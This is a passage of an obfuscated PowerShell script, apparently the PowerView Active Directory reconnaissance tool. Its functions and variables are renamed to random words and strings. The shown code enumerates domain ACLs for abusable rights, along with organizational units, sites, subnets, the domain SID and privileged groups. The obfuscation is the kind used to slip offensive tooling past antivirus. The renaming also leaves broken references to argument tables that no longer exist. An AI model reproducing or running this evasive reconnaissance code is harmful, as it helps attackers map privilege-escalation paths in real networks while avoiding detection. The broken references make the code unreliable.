        if ($PSBoundParameters['SearchBase']) { $WGnEEzJx99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $WGnEEzJx99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $WGnEEzJx99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $WGnEEzJx99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $WGnEEzJx99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $WGnEEzJx99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $WGnEEzJx99['Credential'] = $gxazvivN99 }
        $VmkJyBhe99 = @{
            'Properties' = 'samaccountname,objectclass'
            'Raw' = $True
        }
        if ($PSBoundParameters['Server']) { $VmkJyBhe99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $VmkJyBhe99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $VmkJyBhe99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VmkJyBhe99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $VmkJyBhe99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $VmkJyBhe99['Credential'] = $gxazvivN99 }
        $GnxtbMaP99 = @{}
        if ($PSBoundParameters['Server']) { $GnxtbMaP99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['Credential']) { $GnxtbMaP99['Credential'] = $gxazvivN99 }
        $xToCksFH99 = @{}
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $WGnEEzJx99['Domain'] = $SSNUOPgW99
            $GnxtbMaP99['Domain'] = $SSNUOPgW99
        }
        pols @ACLArguments | ForEach-Object {
            if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {
                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if ($xToCksFH99[$_.SecurityIdentifier.Value]) {
                        $vuOViPzg99, $AVCaQWcv99, $viRLpUZY99, $zJuoKMSR99 = $xToCksFH99[$_.SecurityIdentifier.Value]
                        $aqAiPrDf99 = New-Object PSObject
                        $aqAiPrDf99 | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                        $aqAiPrDf99 | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                        $aqAiPrDf99 | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $aqAiPrDf99 | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                        }
                        else {
                            $aqAiPrDf99 | Add-Member NoteProperty 'ObjectAceType' 'None'
                        }
                        $aqAiPrDf99 | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                        $aqAiPrDf99 | Add-Member NoteProperty 'AceType' $_.AceType
                        $aqAiPrDf99 | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                        $aqAiPrDf99 | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                        $aqAiPrDf99 | Add-Member NoteProperty 'IdentityReferenceName' $vuOViPzg99
                        $aqAiPrDf99 | Add-Member NoteProperty 'IdentityReferenceDomain' $AVCaQWcv99
                        $aqAiPrDf99 | Add-Member NoteProperty 'IdentityReferenceDN' $viRLpUZY99
                        $aqAiPrDf99 | Add-Member NoteProperty 'IdentityReferenceClass' $zJuoKMSR99
                        $aqAiPrDf99
                    }
                    else {
                        $viRLpUZY99 = kinsman -Identity $_.SecurityIdentifier.Value -OutputType DN @ADNameArguments
                        if ($viRLpUZY99) {
                            $AVCaQWcv99 = $viRLpUZY99.SubString($viRLpUZY99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            $VmkJyBhe99['Domain'] = $AVCaQWcv99
                            $VmkJyBhe99['Identity'] = $viRLpUZY99
                            $Object = farrowing @ObjectSearcherArguments
                            if ($Object) {
                                $vuOViPzg99 = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match 'computer') {
                                    $zJuoKMSR99 = 'computer'
                                }
                                elseif ($Object.Properties.objectclass -match 'group') {
                                    $zJuoKMSR99 = 'group'
                                }
                                elseif ($Object.Properties.objectclass -match 'user') {
                                    $zJuoKMSR99 = 'user'
                                }
                                else {
                                    $zJuoKMSR99 = $Null
                                }
                                $xToCksFH99[$_.SecurityIdentifier.Value] = $vuOViPzg99, $AVCaQWcv99, $viRLpUZY99, $zJuoKMSR99
                                $aqAiPrDf99 = New-Object PSObject
                                $aqAiPrDf99 | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                                $aqAiPrDf99 | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                                $aqAiPrDf99 | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $aqAiPrDf99 | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                                }
                                else {
                                    $aqAiPrDf99 | Add-Member NoteProperty 'ObjectAceType' 'None'
                                }
                                $aqAiPrDf99 | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                                $aqAiPrDf99 | Add-Member NoteProperty 'AceType' $_.AceType
                                $aqAiPrDf99 | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                                $aqAiPrDf99 | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                                $aqAiPrDf99 | Add-Member NoteProperty 'IdentityReferenceName' $vuOViPzg99
                                $aqAiPrDf99 | Add-Member NoteProperty 'IdentityReferenceDomain' $AVCaQWcv99
                                $aqAiPrDf99 | Add-Member NoteProperty 'IdentityReferenceDN' $viRLpUZY99
                                $aqAiPrDf99 | Add-Member NoteProperty 'IdentityReferenceClass' $zJuoKMSR99
                                $aqAiPrDf99
                            }
                        }
                        else {
                            Write-Warning "[voile] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with kinsman"
                        }
                    }
                }
            }
        }
    }
}
function ivies {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $BfpbWwpi99,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $OyouMTgX99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $SdzJuWMG99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $tmZARvdq99,
        [Switch]
        $rPozaKft99,
        [Alias('ReturnOne')]
        [Switch]
        $QtcSidjx99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $PPosolen99 = @{}
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        $AUTDYHIn99 = watersides @SearcherArguments
    }
    PROCESS {
        if ($AUTDYHIn99) {
            $afFJXkRc99 = ''
            $kXbEpVCq99 = ''
            $BfpbWwpi99 | Where-Object {$_} | ForEach-Object {
                $QghnbJOP99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($QghnbJOP99 -match '^OU=.*') {
                    $afFJXkRc99 += "(distinguishedname=$QghnbJOP99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $BvhyhWZG99 = $QghnbJOP99.SubString($QghnbJOP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[ivies] Extracted domain '$BvhyhWZG99' from '$QghnbJOP99'"
                        $PPosolen99['Domain'] = $BvhyhWZG99
                        $AUTDYHIn99 = watersides @SearcherArguments
                        if (-not $AUTDYHIn99) {
                            Write-Warning "[ivies] Unable to retrieve domain searcher for '$BvhyhWZG99'"
                        }
                    }
                }
                else {
                    try {
                        $DwsqqDxI99 = (-Join (([Guid]$QghnbJOP99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $afFJXkRc99 += "(objectguid=$DwsqqDxI99)"
                    }
                    catch {
                        $afFJXkRc99 += "(name=$QghnbJOP99)"
                    }
                }
            }
            if ($afFJXkRc99 -and ($afFJXkRc99.Trim() -ne '') ) {
                $kXbEpVCq99 += "(|$afFJXkRc99)"
            }
            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[ivies] Searching for OUs with $OyouMTgX99 set in the gpLink property"
                $kXbEpVCq99 += "(gplink=*$OyouMTgX99*)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[ivies] Using additional LDAP filter: $HOOTOEqu99"
                $kXbEpVCq99 += "$HOOTOEqu99"
            }
            $AUTDYHIn99.filter = "(&(objectCategory=organizationalUnit)$kXbEpVCq99)"
            Write-Verbose "[ivies] ivies filter string: $($AUTDYHIn99.filter)"
            if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $AUTDYHIn99.FindOne() }
            else { $pfqXXMQd99 = $AUTDYHIn99.FindAll() }
            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $OU = $_
                }
                else {
                    $OU = Buddy -Properties $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                $OU
            }
            if ($pfqXXMQd99) {
                try { $pfqXXMQd99.dispose() }
                catch {
                    Write-Verbose "[ivies] Error disposing of the Results object: $_"
                }
            }
            $AUTDYHIn99.dispose()
        }
    }
}
function shoddiness {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $BfpbWwpi99,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $OyouMTgX99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $SdzJuWMG99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $tmZARvdq99,
        [Switch]
        $rPozaKft99,
        [Alias('ReturnOne')]
        [Switch]
        $QtcSidjx99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $PPosolen99 = @{
            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        $LwULXdvl99 = watersides @SearcherArguments
    }
    PROCESS {
        if ($LwULXdvl99) {
            $afFJXkRc99 = ''
            $kXbEpVCq99 = ''
            $BfpbWwpi99 | Where-Object {$_} | ForEach-Object {
                $QghnbJOP99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($QghnbJOP99 -match '^CN=.*') {
                    $afFJXkRc99 += "(distinguishedname=$QghnbJOP99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $BvhyhWZG99 = $QghnbJOP99.SubString($QghnbJOP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[shoddiness] Extracted domain '$BvhyhWZG99' from '$QghnbJOP99'"
                        $PPosolen99['Domain'] = $BvhyhWZG99
                        $LwULXdvl99 = watersides @SearcherArguments
                        if (-not $LwULXdvl99) {
                            Write-Warning "[shoddiness] Unable to retrieve domain searcher for '$BvhyhWZG99'"
                        }
                    }
                }
                else {
                    try {
                        $DwsqqDxI99 = (-Join (([Guid]$QghnbJOP99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $afFJXkRc99 += "(objectguid=$DwsqqDxI99)"
                    }
                    catch {
                        $afFJXkRc99 += "(name=$QghnbJOP99)"
                    }
                }
            }
            if ($afFJXkRc99 -and ($afFJXkRc99.Trim() -ne '') ) {
                $kXbEpVCq99 += "(|$afFJXkRc99)"
            }
            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[shoddiness] Searching for sites with $OyouMTgX99 set in the gpLink property"
                $kXbEpVCq99 += "(gplink=*$OyouMTgX99*)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[shoddiness] Using additional LDAP filter: $HOOTOEqu99"
                $kXbEpVCq99 += "$HOOTOEqu99"
            }
            $LwULXdvl99.filter = "(&(objectCategory=site)$kXbEpVCq99)"
            Write-Verbose "[shoddiness] shoddiness filter string: $($LwULXdvl99.filter)"
            if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $LwULXdvl99.FindAll() }
            else { $pfqXXMQd99 = $LwULXdvl99.FindAll() }
            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $Site = $_
                }
                else {
                    $Site = Buddy -Properties $_.Properties
                }
                $Site.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                $Site
            }
            if ($pfqXXMQd99) {
                try { $pfqXXMQd99.dispose() }
                catch {
                    Write-Verbose "[shoddiness] Error disposing of the Results object"
                }
            }
            $LwULXdvl99.dispose()
        }
    }
}
function pianissimi {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $BfpbWwpi99,
        [ValidateNotNullOrEmpty()]
        [String]
        $nqApdsmI99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $SdzJuWMG99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $tmZARvdq99,
        [Switch]
        $rPozaKft99,
        [Alias('ReturnOne')]
        [Switch]
        $QtcSidjx99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $PPosolen99 = @{
            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        $ghyRsntb99 = watersides @SearcherArguments
    }
    PROCESS {
        if ($ghyRsntb99) {
            $afFJXkRc99 = ''
            $kXbEpVCq99 = ''
            $BfpbWwpi99 | Where-Object {$_} | ForEach-Object {
                $QghnbJOP99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($QghnbJOP99 -match '^CN=.*') {
                    $afFJXkRc99 += "(distinguishedname=$QghnbJOP99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $BvhyhWZG99 = $QghnbJOP99.SubString($QghnbJOP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[pianissimi] Extracted domain '$BvhyhWZG99' from '$QghnbJOP99'"
                        $PPosolen99['Domain'] = $BvhyhWZG99
                        $ghyRsntb99 = watersides @SearcherArguments
                        if (-not $ghyRsntb99) {
                            Write-Warning "[pianissimi] Unable to retrieve domain searcher for '$BvhyhWZG99'"
                        }
                    }
                }
                else {
                    try {
                        $DwsqqDxI99 = (-Join (([Guid]$QghnbJOP99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $afFJXkRc99 += "(objectguid=$DwsqqDxI99)"
                    }
                    catch {
                        $afFJXkRc99 += "(name=$QghnbJOP99)"
                    }
                }
            }
            if ($afFJXkRc99 -and ($afFJXkRc99.Trim() -ne '') ) {
                $kXbEpVCq99 += "(|$afFJXkRc99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[pianissimi] Using additional LDAP filter: $HOOTOEqu99"
                $kXbEpVCq99 += "$HOOTOEqu99"
            }
            $ghyRsntb99.filter = "(&(objectCategory=subnet)$kXbEpVCq99)"
            Write-Verbose "[pianissimi] pianissimi filter string: $($ghyRsntb99.filter)"
            if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $ghyRsntb99.FindOne() }
            else { $pfqXXMQd99 = $ghyRsntb99.FindAll() }
            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $TNlfrYlC99 = $_
                }
                else {
                    $TNlfrYlC99 = Buddy -Properties $_.Properties
                }
                $TNlfrYlC99.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')
                if ($PSBoundParameters['SiteName']) {
                    if ($TNlfrYlC99.properties -and ($TNlfrYlC99.properties.siteobject -like "*$nqApdsmI99*")) {
                        $TNlfrYlC99
                    }
                    elseif ($TNlfrYlC99.siteobject -like "*$nqApdsmI99*") {
                        $TNlfrYlC99
                    }
                }
                else {
                    $TNlfrYlC99
                }
            }
            if ($pfqXXMQd99) {
                try { $pfqXXMQd99.dispose() }
                catch {
                    Write-Verbose "[pianissimi] Error disposing of the Results object: $_"
                }
            }
            $ghyRsntb99.dispose()
        }
    }
}
function disobedience {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    $PPosolen99 = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
    if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
    if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
    $DCSID = doubtlessly @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid
    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
        Write-Verbose "[disobedience] Error extracting domain SID for '$SSNUOPgW99'"
    }
}
function burlap {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $BfpbWwpi99,
        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $jTlZdhsL99,
        [Switch]
        $wfGmLtet99,
        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $IHtNVbwJ99,
        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $sqCmFczP99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $SdzJuWMG99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $tmZARvdq99,
        [Switch]
        $rPozaKft99,
        [Alias('ReturnOne')]
        [Switch]
        $QtcSidjx99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $PPosolen99 = @{}
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        $vLzWmKPH99 = watersides @SearcherArguments
    }
    PROCESS {
        if ($vLzWmKPH99) {
            if ($PSBoundParameters['MemberIdentity']) {
                if ($PPosolen99['Properties']) {
                    $QEbPmGkV99 = $PPosolen99['Properties']
                }
                $PPosolen99['Identity'] = $jTlZdhsL99
                $PPosolen99['Raw'] = $True
                farrowing @SearcherArguments | ForEach-Object {
                    $bhUEnzFl99 = $_.GetDirectoryEntry()
                    $bhUEnzFl99.RefreshCache('tokenGroups')
                    $bhUEnzFl99.TokenGroups | ForEach-Object {
                        $LmXmVdGr99 = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                        if ($LmXmVdGr99 -notmatch '^S-1-5-32-.*') {
                            $PPosolen99['Identity'] = $LmXmVdGr99
                            $PPosolen99['Raw'] = $False
                            if ($QEbPmGkV99) { $PPosolen99['Properties'] = $QEbPmGkV99 }
                            $Group = farrowing @SearcherArguments
                            if ($Group) {
                                $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $afFJXkRc99 = ''
                $kXbEpVCq99 = ''
                $BfpbWwpi99 | Where-Object {$_} | ForEach-Object {
                    $QghnbJOP99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($QghnbJOP99 -match '^S-1-') {
                        $afFJXkRc99 += "(objectsid=$QghnbJOP99)"
                    }
                    elseif ($QghnbJOP99 -match '^CN=') {
                        $afFJXkRc99 += "(distinguishedname=$QghnbJOP99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $BvhyhWZG99 = $QghnbJOP99.SubString($QghnbJOP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[burlap] Extracted domain '$BvhyhWZG99' from '$QghnbJOP99'"
                            $PPosolen99['Domain'] = $BvhyhWZG99
                            $vLzWmKPH99 = watersides @SearcherArguments
                            if (-not $vLzWmKPH99) {
                                Write-Warning "[burlap] Unable to retrieve domain searcher for '$BvhyhWZG99'"
                            }
                        }
                    }
                    elseif ($QghnbJOP99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $DwsqqDxI99 = (([Guid]$QghnbJOP99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $afFJXkRc99 += "(objectguid=$DwsqqDxI99)"
                    }
                    elseif ($QghnbJOP99.Contains('\')) {
                        $TzefbTEv99 = $QghnbJOP99.Replace('\28', '(').Replace('\29', ')') | kinsman -OutputType Canonical
                        if ($TzefbTEv99) {
                            $BBaSdAsr99 = $TzefbTEv99.SubString(0, $TzefbTEv99.IndexOf('/'))
                            $SZjbzmKX99 = $QghnbJOP99.Split('\')[1]
                            $afFJXkRc99 += "(samAccountName=$SZjbzmKX99)"
                            $PPosolen99['Domain'] = $BBaSdAsr99
                            Write-Verbose "[burlap] Extracted domain '$BBaSdAsr99' from '$QghnbJOP99'"
                            $vLzWmKPH99 = watersides @SearcherArguments
                        }
                    }
                    else {
                        $afFJXkRc99 += "(|(samAccountName=$QghnbJOP99)(name=$QghnbJOP99))"
                    }
                }
                if ($afFJXkRc99 -and ($afFJXkRc99.Trim() -ne '') ) {
                    $kXbEpVCq99 += "(|$afFJXkRc99)"
                }
                if ($PSBoundParameters['AdminCount']) {
                    Write-Verbose '[burlap] Searching for adminCount=1'
                    $kXbEpVCq99 += '(admincount=1)'
                }
